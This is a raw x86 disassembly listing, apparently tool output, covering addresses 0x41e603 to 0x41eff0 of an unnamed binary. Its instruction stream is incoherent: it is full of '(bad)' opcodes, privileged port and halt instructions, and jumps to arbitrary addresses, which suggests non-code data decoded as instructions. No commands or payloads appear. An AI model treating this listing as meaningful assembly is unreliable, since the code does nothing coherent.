  41e603:	sub    al,0x5f
  41e605:	cdq    
  41e606:	pop    ss
  41e607:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e608:	faddp  st(2),st
  41e60a:	or     BYTE PTR [ecx],bl
  41e60c:	push   0xffffffbf
  41e60e:	sbb    DWORD PTR [ebx-0xb6345c5],0xffffffa7
  41e615:	stc    
  41e616:	loopne 0x41e5f8
  41e618:	(bad)  
  41e61a:	out    0x53,al
  41e61c:	addr16 dec edx
  41e61e:	cmp    eax,0x21a450f1
  41e623:	imul   edi,DWORD PTR [edi],0x1164ac14
  41e629:	or     BYTE PTR [ebx-0x793a102b],0xb
  41e630:	sbb    ebx,ecx
  41e632:	sbb    al,ch
  41e634:	jno    0x41e636
	...
  41e696:	lds    ebx,FWORD PTR [eax+0x7dfd55e1]
  41e69c:	cmc    
  41e69d:	cwde   
  41e69e:	xchg   edx,eax
  41e69f:	fmul   st(5),st
  41e6a1:	mov    ds:0xb15cd942,al
  41e6a6:	std    
  41e6a7:	inc    ecx
  41e6a8:	add    DWORD PTR [eax],eax
  41e6aa:	pop    es
  41e6ab:	add    DWORD PTR [eax],eax
  41e6ad:	add    al,al
  41e6af:	mov    di,0x6afc
  41e6b3:	xchg   esp,eax
  41e6b4:	jnp    0x41e693
  41e6b6:	or     eax,0xa606d1bd
  41e6bb:	sbb    edx,DWORD PTR [edx-0x47]
  41e6be:	push   ds
  41e6bf:	cmc    
  41e6c0:	test   eax,0x25ee5812
  41e6c5:	fucomp st(7)
  41e6c7:	scas   al,BYTE PTR es:[edi]
  41e6c8:	stos   BYTE PTR es:[edi],al
  41e6c9:	mov    eax,ds:0x3a6017b
  41e6ce:	outs   dx,BYTE PTR ds:[esi]
  41e6cf:	aas    
  41e6d0:	(bad)  
  41e6d1:	int    0xae
  41e6d3:	push   0xffffffd0
  41e6d5:	(bad)  
  41e6d6:	mov    bl,0x4e
  41e6d8:	in     eax,0xd1
  41e6da:	pop    edi
  41e6db:	mov    ds:0x460123ea,al
  41e6e0:	push   esp
  41e6e1:	xchg   edx,eax
  41e6e2:	je     0x41e67c
  41e6e4:	xor    ebx,DWORD PTR [esi+0x9]
  41e6e7:	or     ch,dh
  41e6e9:	and    ah,al
  41e6eb:	in     al,0x7d
  41e6ed:	sbb    al,0xa2
  41e6ef:	fwait
  41e6f0:	add    bl,BYTE PTR [edx]
  41e6f2:	ins    BYTE PTR es:[edi],dx
  41e6f3:	imul   ebp,DWORD PTR ds:0x749499ea,0x14da46bd
  41e6fd:	pop    ebp
  41e6fe:	mov    al,0x2d
  41e700:	dec    ebp
  41e701:	mov    edx,0xe95427de
  41e706:	cmp    al,BYTE PTR [esi]
  41e708:	jne    0x41e6ee
  41e70a:	and    eax,0x81eb034d
  41e70f:	add    esi,ecx
  41e711:	push   esi
  41e712:	inc    eax
  41e713:	mov    eax,ds:0xdb18492e
  41e718:	hlt    
  41e719:	js     0x41e73d
  41e71b:	loop   0x41e732
  41e71d:	add    cl,dh
  41e71f:	dec    esi
  41e720:	xor    esi,DWORD PTR [ebx]
  41e722:	inc    esi
  41e723:	adc    al,0xaa
  41e725:	mov    al,0xda
  41e727:	test   BYTE PTR [esi-0x57],bh
  41e72a:	int    0x9f
  41e72c:	loope  0x41e785
  41e72e:	add    al,0xe0
  41e730:	fadd   QWORD PTR [esi]
  41e732:	(bad)  
  41e733:	jle    0x41e77c
  41e735:	sbb    al,0x53
  41e737:	fs test ebp,edi
  41e73a:	in     al,0x7c
  41e73c:	xlat   BYTE PTR ds:[ebx]
  41e73d:	mov    DWORD PTR [esi+eiz*8+0x6e68783b],ecx
  41e744:	lods   al,BYTE PTR ds:[esi]
  41e745:	cdq    
  41e746:	out    0x3,eax
  41e748:	loop   0x41e73e
  41e74a:	ror    bl,0xb1
  41e74d:	mov    ch,0xfb
  41e74f:	stc    
  41e750:	push   ebx
  41e751:	mov    ss,edi
  41e753:	push   eax
  41e754:	and    eax,0x64769b78
  41e759:	adc    bh,bh
  41e75b:	inc    edi
  41e75c:	lea    esp,[esp+eiz*8+0x1e]
  41e760:	bswap  esp
  41e762:	dec    ebx
  41e763:	sub    DWORD PTR [ebx-0x60],0x14
  41e767:	iret   
  41e768:	fistp  DWORD PTR [esi+0x7440cd71]
  41e76e:	leave  
  41e76f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e770:	xor    DWORD PTR [ebx+0x2a8123db],esi
  41e776:	push   ecx
  41e777:	loop   0x41e6fe
  41e779:	mov    ds:0x6335da1,al
  41e77e:	scas   eax,DWORD PTR es:[edi]
  41e77f:	xchg   BYTE PTR [ecx+0x3742c7d3],cl
  41e785:	adc    eax,0xc75218b2
  41e78a:	rcr    DWORD PTR [ecx+0x55],1
  41e78d:	push   0xffffffad
  41e78f:	push   ecx
  41e790:	or     DWORD PTR [edi],esp
  41e792:	xchg   ebp,eax
  41e793:	push   ebp
  41e794:	mov    ah,0x42
  41e796:	sub    ebx,DWORD PTR [edi+ecx*2]
  41e799:	ret    
  41e79a:	xor    ebp,esp
  41e79c:	xor    eax,DWORD PTR [esi+0x12d857d8]
  41e7a2:	cmp    dl,BYTE PTR [edx+0x5932fb01]
  41e7a8:	mov    ecx,0xf6f604fd
  41e7ad:	das    
  41e7ae:	ret    
  41e7af:	sub    cl,BYTE PTR es:[esi+eiz*8+0x2a]
  41e7b4:	loope  0x41e7b6
	...
  41e816:	sub    eax,0x9e5c8a39
  41e81b:	(bad)  
  41e81c:	(bad)  
  41e81d:	jns    0x41e875
  41e81f:	imul   ebx,DWORD PTR [esi+eiz*2],0xffffffd8
  41e823:	retf   0x21f8
  41e826:	add    al,0x43
  41e828:	add    DWORD PTR [eax],eax
  41e82a:	pop    es
  41e82b:	add    DWORD PTR [eax],eax
  41e82d:	add    dh,ch
  41e82f:	and    al,0x21
  41e831:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e832:	mov    edi,0xdddaf070
  41e837:	xor    edi,DWORD PTR [edx+edi*1-0x5abfce42]
  41e83e:	mov    ch,0x17
  41e840:	sbb    dl,BYTE PTR [ebx]
  41e842:	dec    esi
  41e843:	sub    DWORD PTR [edx-0x7be26e6e],eax
  41e849:	or     esp,DWORD PTR [ebx+esi*4+0x66d6741e]
  41e850:	mov    bh,0x1b
  41e852:	daa    
  41e853:	clc    
  41e854:	mov    WORD PTR [edi-0x3ac9d082],?
  41e85a:	gs pop esi
  41e85c:	xchg   ecx,eax
  41e85d:	cmp    BYTE PTR [ebx+0xbb81a3f],dl
  41e863:	test   DWORD PTR [ecx-0x408beeea],ebx
  41e869:	data16 and al,0x87
  41e86c:	in     eax,0x7
  41e86e:	mov    bh,0xd0
  41e870:	xchg   esi,eax
  41e871:	shl    BYTE PTR cs:[esi],cl
  41e874:	(bad)  
  41e875:	sbb    BYTE PTR [edx+0xa],dl
  41e878:	test   eax,0x320b85aa
  41e87d:	pop    ecx
  41e87e:	adc    bl,bh
  41e880:	aas    
  41e881:	dec    edi
  41e882:	ror    BYTE PTR [ecx],0x7e
  41e885:	mov    esi,0xe14ee30e
  41e88a:	movhps xmm3,QWORD PTR [ebx-0x62]
  41e88e:	add    BYTE PTR [edi-0xe],dh
  41e891:	sub    DWORD PTR [esi-0x69],0xffffffe8
  41e895:	jmp    0x41e908
  41e897:	ror    BYTE PTR [esi+0x5ecc7b54],1
  41e89d:	xor    eax,0xc0c6f8e9
  41e8a2:	ins    DWORD PTR es:[edi],dx
  41e8a3:	fsubr  DWORD PTR [edi+edx*1-0x7628332f]
  41e8aa:	push   eax
  41e8ab:	mov    ch,0x7a
  41e8ad:	fild   QWORD PTR [ecx]
  41e8af:	xor    eax,0x810ce164
  41e8b4:	push   esi
  41e8b5:	in     eax,dx
  41e8b6:	loopne 0x41e8ec
  41e8b8:	or     bh,dh
  41e8ba:	pop    es
  41e8bb:	loopne 0x41e84b
  41e8bd:	sbb    eax,0xf3d24e8c
  41e8c2:	nop
  41e8c3:	div    DWORD PTR cs:[ebp-0x628cb290]
  41e8ca:	cmp    edx,edi
  41e8cc:	stos   DWORD PTR es:[edi],eax
  41e8cd:	jecxz  0x41e859
  41e8cf:	dec    eax
  41e8d0:	lods   al,BYTE PTR ds:[esi]
  41e8d2:	push   ecx
  41e8d3:	dec    eax
  41e8d4:	mov    edx,0x450d0a4f
  41e8d9:	cmp    ah,BYTE PTR [ebx+0x12]
  41e8dc:	aad    0x8d
  41e8de:	jne    0x41e8bf
  41e8e0:	inc    edi
  41e8e1:	ja     0x41e8ab
  41e8e3:	loope  0x41e957
  41e8e5:	out    0xd,eax
  41e8e7:	mov    al,ds:0x8fe97d65
  41e8ec:	out    0x1a,eax
  41e8ee:	lock pop ecx
  41e8f0:	cdq    
  41e8f1:	(bad)  
  41e8f2:	sti    
  41e8f3:	and    esp,esp
  41e8f5:	jl     0x41e910
  41e8f7:	dec    esp
  41e8f8:	aaa    
  41e8f9:	inc    esi
  41e8fa:	dec    edi
  41e8fb:	or     bh,BYTE PTR [esi]
  41e8fd:	(bad)  
  41e8fe:	xor    eax,0xdc634936
  41e903:	dec    esi
  41e904:	adc    DWORD PTR [edx+0x7126abf1],ecx
  41e90a:	(bad)  
  41e90b:	in     al,0x4f
  41e90d:	ret    0xf542
  41e910:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e911:	cs mov al,0xd8
  41e914:	and    al,0xf9
  41e916:	jl     0x41e96a
  41e918:	sbb    edx,DWORD PTR [edx]
  41e91a:	outs   dx,DWORD PTR ds:[esi]
  41e91b:	(bad)  
  41e91c:	cmp    edi,esp
  41e91e:	fwait
  41e91f:	jns    0x41e8d7
  41e921:	push   edi
  41e922:	and    BYTE PTR ds:0x5357bd36,0x89
  41e929:	jne    0x41e933
  41e92b:	fistp  WORD PTR [eax-0x3f401bd2]
  41e931:	outs   dx,DWORD PTR ds:[esi]
  41e932:	outs   dx,BYTE PTR ds:[esi]
  41e933:	or     BYTE PTR [ebp+0x0],bl
	...
  41e995:	add    BYTE PTR [eax-0x3],bh
  41e998:	ret    0xc766
  41e99b:	jg     0x41e999
  41e99d:	(bad)  
  41e99e:	jmp    0x41e94c
  41e9a0:	repnz xchg ecx,eax
  41e9a2:	cmp    al,BYTE PTR [ecx+0xc]
  41e9a5:	pop    esp
  41e9a6:	or     eax,DWORD PTR [ecx+eax*1+0x0]
  41e9aa:	pop    es
  41e9ab:	add    DWORD PTR [eax],eax
  41e9ad:	add    BYTE PTR [ebx+0x1ab3f2fe],dl
  41e9b3:	clc    
  41e9b4:	je     0x41e9d0
  41e9b6:	shl    esi,0x2f
  41e9b9:	or     eax,0x38948eda
  41e9be:	add    eax,0xa6f95304
  41e9c3:	mov    bh,0xaf
  41e9c5:	dec    esi
  41e9c6:	mov    ch,0x50
  41e9c8:	inc    edx
  41e9c9:	inc    ebp
  41e9ca:	xor    BYTE PTR [ecx+0x6a33ecd],bh
  41e9d0:	mov    esp,0x31401912
  41e9d5:	in     al,dx
  41e9d6:	mov    ds:0xed816aa7,al
  41e9db:	sar    BYTE PTR [eax],0x9e
  41e9de:	mov    ecx,0x6e0f9689
  41e9e3:	jb     0x41e98d
  41e9e5:	retf   
  41e9e6:	jmp    0x41ea3a
  41e9e8:	stc    
  41e9e9:	xor    eax,0x4702c2d
  41e9ee:	mov    ebx,0xa3ae5d1d
  41e9f3:	or     DWORD PTR [eax+esi*4+0x71],esi
  41e9f7:	shl    DWORD PTR [ebp+edi*8-0x78],1
  41e9fb:	enter  0x6b7,0xa6
  41e9ff:	sbb    bl,BYTE PTR [eax-0x63]
  41ea02:	jecxz  0x41ea34
  41ea04:	bound  ecx,QWORD PTR [ecx+0x3e]
  41ea07:	test   DWORD PTR [ebx-0xb],edx
  41ea0a:	push   ss
  41ea0b:	xchg   ebp,eax
  41ea0c:	cdq    
  41ea0d:	ret    
  41ea0e:	sti    
  41ea0f:	xor    bh,ah
  41ea11:	add    BYTE PTR [eax+0x1b91020e],bh
  41ea17:	outs   dx,BYTE PTR ds:[esi]
  41ea18:	fdivrp st(7),st
  41ea1a:	lahf   
  41ea1b:	inc    esi
  41ea1c:	jecxz  0x41ea27
  41ea1e:	xchg   edi,eax
  41ea1f:	mov    WORD PTR [edx+0x17],fs
  41ea22:	rol    BYTE PTR [edx+edi*8+0x69e7fafb],0x6e
  41ea2a:	inc    ecx
  41ea2b:	clc    
  41ea2c:	or     BYTE PTR [ecx],bl
  41ea2e:	sbb    al,0x49
  41ea30:	or     eax,DWORD PTR [ecx+0x4931b0]
  41ea36:	xchg   esp,eax
  41ea37:	mov    cl,0xd3
  41ea39:	aam    0xdf
  41ea3b:	out    dx,eax
  41ea3c:	loopne 0x41e9d4
  41ea3e:	es xchg edi,eax
  41ea40:	mov    ebx,0xd1d3b9d1
  41ea45:	(bad)  
  41ea46:	into   
  41ea47:	xchg   edi,eax
  41ea48:	in     eax,0xfd
  41ea4a:	mov    ebp,0x3cf2bff1
  41ea4f:	or     BYTE PTR [eax+eiz*1-0x688e76e9],0x8e
  41ea57:	mov    ch,0x8a
  41ea59:	or     DWORD PTR [ebp+esi*8+0x72df3a66],edx
  41ea60:	in     al,dx
  41ea61:	cmp    esi,ecx
  41ea63:	xlat   BYTE PTR ds:[ebx]
  41ea64:	out    dx,eax
  41ea65:	sbb    DWORD PTR [edx-0x4a],edi
  41ea68:	cmp    ecx,DWORD PTR [eax+0x24be5bd6]
  41ea6e:	je     0x41e9ff
  41ea70:	aad    0x96
  41ea72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea73:	mov    ebp,0xe3971fd1
  41ea78:	fnsave [esi+edx*1+0x1b]
  41ea7c:	jmp    0x41ea8c
  41ea7e:	data16 aam 0xae
  41ea81:	push   0xffffffc2
  41ea83:	jae    0x41eae0
  41ea85:	mov    ah,0x48
  41ea87:	mov    esp,0x611a004a
  41ea8c:	jns    0x41eab0
  41ea8e:	retf   0xb56e
  41ea91:	mov    WORD PTR [esi+0x2d391c7c],fs
  41ea97:	fidiv  WORD PTR fs:[ebp+edx*8+0x285fad87]
  41ea9f:	push   esi
  41eaa0:	mov    ecx,0x60352a77
  41eaa5:	push   ebp
  41eaa6:	mov    dl,0x2
  41eaa8:	dec    ebx
  41eaa9:	fcomp  QWORD PTR [eax]
  41eaab:	scas   al,BYTE PTR es:[edi]
  41eaac:	shr    bl,1
  41eaae:	cmc    
  41eaaf:	mov    ds:0xdb5718fe,al
  41eab4:	add    DWORD PTR [eax],0x0
	...
  41eb16:	adc    ch,BYTE PTR [edi]
  41eb18:	mov    esi,DWORD PTR [edi+edi*4+0x22af3fb4]
  41eb1f:	and    ebp,DWORD PTR [eax]
  41eb21:	fstp   DWORD PTR [ebx+0x1e]
  41eb24:	jns    0x41eb49
  41eb26:	adc    al,BYTE PTR [ebp+0x1]
  41eb29:	add    BYTE PTR [edi],al
  41eb2b:	add    DWORD PTR [eax],eax
  41eb2d:	add    BYTE PTR [ebp+0x31],bh
  41eb30:	adc    eax,0x1d26b592
  41eb35:	cmp    DWORD PTR [ebx+0x2e],eax
  41eb38:	inc    esi
  41eb39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb3a:	xchg   ecx,eax
  41eb3b:	and    ebx,DWORD PTR [ebx+0x318e4219]
  41eb41:	push   esp
  41eb42:	push   0x69
  41eb44:	test   DWORD PTR [ebx-0x6a],ebp
  41eb47:	cdq    
  41eb48:	imul   ecx,ecx,0xa581d347
  41eb4e:	popa   
  41eb4f:	or     al,BYTE PTR [ecx+ebx*1]
  41eb52:	fimul  WORD PTR ds:0x15e431b6
  41eb58:	(bad)  
  41eb59:	fstp   st(0)
  41eb5b:	leave  
  41eb5c:	adc    BYTE PTR [edx+0x3db44414],dh
  41eb62:	jno    0x41eb28
  41eb64:	es popf 
  41eb66:	dec    edi
  41eb67:	imul   ecx,DWORD PTR [ebp-0x66c9220],0x5c
  41eb6e:	ror    DWORD PTR [esi],0xfa
  41eb71:	and    dh,cl
  41eb73:	pop    ebx
  41eb74:	dec    esi
  41eb75:	int3   
  41eb76:	inc    eax
  41eb77:	adc    BYTE PTR [esi-0x24a7227d],0xdb
  41eb7e:	push   edi
  41eb7f:	pause  
  41eb81:	ficom  WORD PTR [edi]
  41eb83:	dec    edi
  41eb84:	mov    BYTE PTR [eax-0x6edff47e],cl
  41eb8a:	sub    bh,BYTE PTR [edx+eax*2+0x5682bfa5]
  41eb91:	or     al,BYTE PTR [esi-0x67d79bf8]
  41eb97:	inc    ebx
  41eb98:	sub    BYTE PTR [edx-0x791489e7],dl
  41eb9e:	or     bh,BYTE PTR [ebx]
  41eba0:	inc    eax
  41eba1:	inc    ebx
  41eba2:	cs pop ecx
  41eba4:	(bad)  [eax]
  41eba6:	ins    DWORD PTR es:[edi],dx
  41eba7:	xchg   esi,eax
  41eba8:	scas   eax,DWORD PTR es:[edi]
  41eba9:	lea    ebx,[ecx-0x56]
  41ebac:	dec    edx
  41ebad:	mov    BYTE PTR [edi+0x3ffebf30],bh
  41ebb3:	and    ecx,esi
  41ebb5:	jo     0x41ebc8
  41ebb7:	and    ebp,ecx
  41ebb9:	xor    esp,ebx
  41ebbb:	adc    BYTE PTR [edx-0x7e],ah
  41ebbe:	jge    0x41ebae
  41ebc0:	sti    
  41ebc1:	mov    esi,0x214b1e56
  41ebc6:	sbb    DWORD PTR [ecx-0xc],esp
  41ebc9:	sbb    bl,BYTE PTR [edx+edi*1-0x2ecbd030]
  41ebd0:	or     DWORD PTR [edx],eax
  41ebd2:	adc    al,0x38
  41ebd5:	mov    edi,0xea08ed03
  41ebda:	adc    ch,dh
  41ebdc:	adc    esi,DWORD PTR [edx-0x14508d55]
  41ebe2:	push   0x20a4cb65
  41ebe7:	xchg   edi,eax
  41ebe8:	and    BYTE PTR [ebx-0x9a925fd],ah
  41ebee:	retf   
  41ebef:	jne    0x41eba0
  41ebf1:	fstp   QWORD PTR [edx]
  41ebf3:	in     eax,0x64
  41ebf5:	in     al,0x5
  41ebf7:	es mov esp,esp
  41ebfa:	rol    BYTE PTR [esi+0x5d],0xf4
  41ebfe:	and    DWORD PTR [edi-0x1d],ebp
  41ec01:	xor    al,0x70
  41ec03:	out    0x24,al
  41ec05:	mov    ebp,0xf613ecfa
  41ec0a:	ja     0x41ec66
  41ec0c:	dec    ebp
  41ec0d:	or     esp,esp
  41ec0f:	sub    BYTE PTR [ecx],0x7f
  41ec12:	sbb    eax,0x81a46c9d
  41ec17:	iret   
  41ec18:	mov    DWORD PTR [ecx+eiz*2],edx
  41ec1b:	inc    edi
  41ec1c:	xchg   ebx,eax
  41ec1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec1e:	mov    bh,0xa2
  41ec20:	shr    DWORD PTR [esi+0x56],cl
  41ec23:	ins    DWORD PTR es:[edi],dx
  41ec24:	mov    esi,0x97475003
  41ec29:	add    BYTE PTR [ebp-0x48],cl
  41ec2c:	pop    edx
  41ec2d:	lahf   
  41ec2e:	fld    DWORD PTR [esp+ebp*8]
  41ec31:	fstp   QWORD PTR fs:[ebp+edi*4+0x0]
	...
  41ec96:	inc    ecx
  41ec97:	icebp  
  41ec98:	(bad)
  41ec9b:	hlt    
  41ec9c:	gs icebp 
  41ec9e:	adc    ebx,edi
  41eca0:	ficom  WORD PTR [ecx]
  41eca2:	(bad)  
  41eca3:	sar    DWORD PTR ds:0x14619ac,cl
  41eca9:	add    BYTE PTR [edi],al
  41ecab:	add    DWORD PTR [eax],eax
  41ecad:	add    BYTE PTR [edi],ah
  41ecaf:	or     ah,bl
  41ecb1:	stc    
  41ecb2:	fcmovu st,st(4)
  41ecb4:	arpl   WORD PTR [ebx-0x38f882e2],sp
  41ecba:	mov    ds:0xb7f7781c,al
  41ecbf:	retf   0x6a44
  41ecc2:	cmp    ecx,DWORD PTR [ecx]
  41ecc4:	fs rcl cl,0xb4
  41ecc8:	jnp    0x41ec53
  41ecca:	push   esp
  41eccb:	xor    ch,ch
  41eccd:	fcomip st,st(1)
  41eccf:	pop    eax
  41ecd0:	dec    edi
  41ecd1:	rcl    DWORD PTR [esi+0x31],1
  41ecd4:	dec    eax
  41ecd5:	dec    edi
  41ecd6:	push   0xba40d099
  41ecdb:	test   al,0xec
  41ecdd:	shl    BYTE PTR [ebx-0x2430d014],0x18
  41ece4:	loop   0x41ed43
  41ece6:	add    eax,DWORD PTR [ebx+ebp*2]
  41ece9:	enter  0xe10a,0xc8
  41eced:	imul   ebp
  41ecef:	out    dx,eax
  41ecf0:	or     ch,al
  41ecf2:	push   ss
  41ecf3:	repz out dx,eax
  41ecf5:	cmp    BYTE PTR [esi+esi*8+0x2e559601],ch
  41ecfc:	cmp    BYTE PTR [ecx+0x6a],ah
  41ecff:	jecxz  0x41ecae
  41ed01:	xor    al,ah
  41ed03:	xor    eax,0xc2446ee2
  41ed08:	inc    eax
  41ed09:	shr    DWORD PTR [ecx-0x1149c927],0x9
  41ed10:	mov    WORD PTR [eax],ss
  41ed12:	push   ebp
  41ed13:	xchg   ecx,eax
  41ed14:	cmc    
  41ed15:	fmul   QWORD PTR [eax+0x26063c6b]
  41ed1b:	sub    ah,0xf1
  41ed1e:	sub    esi,DWORD PTR [ecx+ecx*4]
  41ed21:	or     dh,BYTE PTR [ebx]
  41ed23:	or     esi,DWORD PTR [esi+0x3c]
  41ed26:	test   DWORD PTR [ebx-0x2a208873],eax
  41ed2c:	sbb    ecx,eax
  41ed2e:	mov    esi,0x3929660b
  41ed33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ed34:	int3   
  41ed35:	js     0x41ed7c
  41ed37:	outs   dx,BYTE PTR ds:[esi]
  41ed38:	fld    TBYTE PTR [ebp-0x1]
  41ed3b:	jle    0x41edb5
  41ed3d:	adc    al,0x39
  41ed3f:	jmp    0x41ed6e
  41ed41:	inc    esp
  41ed42:	pop    edi
  41ed43:	js     0x41ecf9
  41ed45:	dec    ebx
  41ed46:	ins    BYTE PTR es:[edi],dx
  41ed47:	mul    ebx
  41ed49:	lahf   
  41ed4a:	(bad)  
  41ed4b:	ja     0x41ed4c
  41ed4d:	xchg   edi,eax
  41ed4e:	(bad)  
  41ed4f:	push   0xffffffb0
  41ed51:	xchg   edx,eax
  41ed52:	cmp    eax,0xff47085e
  41ed57:	jge    0x41ed6d
  41ed59:	push   ds
  41ed5a:	outs   dx,DWORD PTR ds:[esi]
  41ed5b:	fbstp  TBYTE PTR [eax+0x31]
  41ed5e:	push   edx
  41ed5f:	push   edx
  41ed60:	retf   
  41ed61:	mov    ecx,0x2879b9af
  41ed66:	cmp    eax,0x1ab14f30
  41ed6b:	push   ecx
  41ed6c:	mov    BYTE PTR [ecx],al
  41ed6e:	dec    ebx
  41ed6f:	(bad)  
  41ed70:	cmp    BYTE PTR [edi-0x3d],dh
  41ed73:	xchg   edi,eax
  41ed74:	ror    BYTE PTR [ecx-0x3f],0x40
  41ed78:	jmp    0x6f9dbda2
  41ed7d:	push   esi
  41ed7e:	gs jecxz 0x41ed5d
  41ed81:	add    esi,eax
  41ed83:	cmp    BYTE PTR [edi+eiz*2-0x7985763f],bh
  41ed8a:	cld    
  41ed8b:	pop    esp
  41ed8c:	adc    al,0x73
  41ed8e:	sub    BYTE PTR [ecx-0x6a],cl
  41ed91:	test   al,0xfb
  41ed93:	je     0x41ed35
  41ed95:	cmc    
  41ed96:	xor    al,0x8a
  41ed98:	mov    ch,0x6a
  41ed9a:	imul   ebx,DWORD PTR [esi],0xffffffb2
  41ed9d:	out    dx,eax
  41ed9e:	call   0x9403:0x9256d0d9
  41eda5:	shr    DWORD PTR [eax],1
  41eda7:	mov    bh,0x6
  41eda9:	pop    eax
  41edaa:	xchg   ebx,eax
  41edab:	mov    al,ds:0x245c1dbf
  41edb0:	fwait
  41edb1:	hlt    
  41edb2:	je     0x41edae
  41edb4:	push   edx
	...
  41ee15:	add    BYTE PTR ds:0x7b197956,al
  41ee1b:	aas    
  41ee1c:	gs pop esi
  41ee1e:	mov    ds:0x575b0a2,al
  41ee23:	xor    dh,cl
  41ee25:	cmp    DWORD PTR [eax],esp
  41ee27:	inc    edi
  41ee28:	add    DWORD PTR [eax],eax
  41ee2a:	pop    es
  41ee2b:	add    DWORD PTR [eax],eax
  41ee2d:	add    ch,bl
  41ee2f:	lock test dl,ah
  41ee32:	xor    DWORD PTR [edi+eiz*4-0x67bcb574],esi
  41ee39:	icebp  
  41ee3a:	imul   ebx,ebx,0x19
  41ee3d:	xlat   BYTE PTR ds:[ebx]
  41ee3e:	ret    0xf1e4
  41ee41:	imul   esp,DWORD PTR [edi-0x126e4470],0x1d
  41ee48:	mov    bl,0x1d
  41ee4a:	or     eax,0x3142cdd0
  41ee4f:	push   eax
  41ee50:	addr16 jle 0x41ee60
  41ee53:	cmp    bl,bh
  41ee55:	push   esi
  41ee56:	sbb    ecx,eax
  41ee58:	data16 jo 0x41ee51
  41ee5b:	into   
  41ee5c:	nop
  41ee5d:	(bad)  
  41ee5e:	lahf   
  41ee5f:	jb     0x41ee6a
  41ee61:	or     cl,BYTE PTR [esi+0x63]
  41ee64:	jns    0x41eed0
  41ee66:	cmp    DWORD PTR [ebp-0x6825c8bb],ebp
  41ee6c:	mov    WORD PTR [ebx],?
  41ee6e:	dec    edi
  41ee6f:	fild   WORD PTR [esi-0x3a713574]
  41ee75:	push   0x8e5a48fb
  41ee7a:	inc    esp
  41ee7b:	mov    edx,0xb55a9fb4
  41ee80:	or     BYTE PTR [esp+eax*1-0x70],al
  41ee84:	lods   al,BYTE PTR ds:[esi]
  41ee85:	jb     0x41eed1
  41ee87:	push   0x43ed16be
  41ee8c:	icebp  
  41ee8d:	hlt    
  41ee8e:	js     0x41ee98
  41ee90:	or     ch,BYTE PTR [esp+eiz*4]
  41ee93:	mov    dl,0xda
  41ee95:	cmc    
  41ee96:	dec    edx
  41ee97:	mov    eax,ds:0xbfbdf6ef
  41ee9c:	ins    BYTE PTR es:[edi],dx
  41ee9d:	adc    BYTE PTR [eax+0x7a],al
  41eea0:	mov    eax,ds:0xf820e02e
  41eea5:	inc    esp
  41eea6:	stos   BYTE PTR es:[edi],al
  41eea7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eea8:	rcl    BYTE PTR [esi-0x61c88df2],cl
  41eeae:	fnstsw WORD PTR [edi]
  41eeb0:	ds mov al,0x12
  41eeb3:	or     eax,0xc8c4b35d
  41eeb8:	pop    ecx
  41eeb9:	loopne 0x41ef14
  41eebb:	xlat   BYTE PTR ds:[ebx]
  41eebc:	inc    edi
  41eebd:	popa   
  41eebe:	sub    ecx,DWORD PTR [ecx+0x6792e7f4]
  41eec4:	loopne 0x41eec7
  41eec6:	scas   eax,DWORD PTR es:[edi]
  41eec7:	mov    ecx,0x3379fd03
  41eecc:	js     0x41ef25
  41eece:	mov    ecx,0xbcbb0264
  41eed3:	mov    BYTE PTR [ebp+ebp*8+0x250d5af5],bl
  41eeda:	fcomp  st(3)
  41eedc:	push   ecx
  41eedd:	sub    eax,0xeb412b44
  41eee2:	stos   DWORD PTR es:[edi],eax
  41eee3:	mov    esp,0x8133814c
  41eee8:	pop    eax
  41eee9:	dec    edx
  41eeea:	das    
  41eeeb:	pop    ds
  41eeec:	std    
  41eeed:	shl    ch,1
  41eeef:	cdq    
  41eef0:	jb     0x41eecd
  41eef2:	in     eax,0x1d
  41eef4:	retf   
  41eef5:	gs jge 0x41eedd
  41eef8:	inc    eax
  41eef9:	lock loope 0x41ef23
  41eefc:	xor    eax,0x6ca1d2b9
  41ef01:	sub    eax,0x79848d1d
  41ef06:	mov    ecx,0x29053da8
  41ef0b:	outs   dx,BYTE PTR ds:[esi]
  41ef0c:	mov    al,ds:0xdbf63348
  41ef11:	lock dec ebx
  41ef13:	xchg   esi,eax
  41ef14:	lock ret 
  41ef16:	add    esp,DWORD PTR [ecx]
  41ef18:	jecxz  0x41eedb
  41ef1a:	int3   
  41ef1b:	cmp    BYTE PTR [eax],ah
  41ef1d:	push   eax
  41ef1e:	sbb    bl,BYTE PTR [edx]
  41ef20:	mov    edi,0x330c54ee
  41ef25:	sahf   
  41ef26:	cld    
  41ef27:	jnp    0x41ef9b
  41ef29:	sti    
  41ef2a:	aad    0x1e
  41ef2c:	and    dl,BYTE PTR [ecx]
  41ef2e:	or     DWORD PTR [ecx-0x6],0x28282748
	...
  41ef95:	add    BYTE PTR [ecx-0xda40a3],bh
  41ef9b:	out    0xbb,eax
  41ef9d:	fnstsw WORD PTR [eax+0x3fceb38]
  41efa3:	fimul  WORD PTR [edi-0xa]
  41efa6:	daa    
  41efa7:	dec    eax
  41efa8:	add    DWORD PTR [eax],eax
  41efaa:	pop    es
  41efab:	add    DWORD PTR [eax],eax
  41efad:	add    BYTE PTR [ebp-0x5709e2f0],bl
  41efb3:	add    BYTE PTR [esi-0x21073c03],dl
  41efb9:	jecxz  0x41ef3f
  41efbb:	push   ss
  41efbc:	adc    BYTE PTR [ecx+0x25],al
  41efbf:	ja     0x41f016
  41efc1:	and    al,0x2d
  41efc3:	fwait
  41efc4:	popa   
  41efc5:	out    0x91,eax
  41efc7:	mov    ebx,0x5d2421c4
  41efcc:	xrelease mov BYTE PTR [ecx+0x56b6c482],bh
  41efd3:	jl     0x41efad
  41efd5:	adc    BYTE PTR [edi-0x71],ah
  41efd8:	in     eax,dx
  41efd9:	cld    
  41efda:	add    eax,DWORD PTR [edi]
  41efdc:	lds    esi,FWORD PTR [ecx-0x7e92cca5]
  41efe2:	or     eax,0x88378316
  41efe7:	les    ebp,FWORD PTR [edx]
  41efe9:	xchg   edi,eax
  41efea:	xor    eax,0x98f916e1
  41efef:	pop    es
  41eff0:	xor    eax,DWORD PTR [edi]
